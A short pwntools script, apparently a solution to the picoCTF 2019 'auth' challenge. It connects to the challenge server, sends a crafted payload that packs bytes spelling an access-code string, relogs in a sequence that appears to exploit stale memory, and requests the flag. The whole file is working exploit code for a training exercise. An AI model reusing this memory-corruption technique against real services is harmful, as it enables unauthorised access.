from pwn import *


payload = '_5had0w_'+p64(0x4343415f544f4f52)+p64(0x45444f435f535345)+'aaaaaaaa'
p = process('./auth')
p = remote('2019shell1.picoctf.com', 37915)
print p.recv()
p.sendline('login')
print p.recv()
p.sendline('33')
print p.recv()
p.sendline(payload)
print p.recv()
p.sendline('logout')
print p.recv()
p.sendline('login')
print p.recv()
p.sendline('4')
print p.recv()
p.sendline('350')
print p.recv()
print p.recv()
p.sendline('print-flag')
print p.recv()
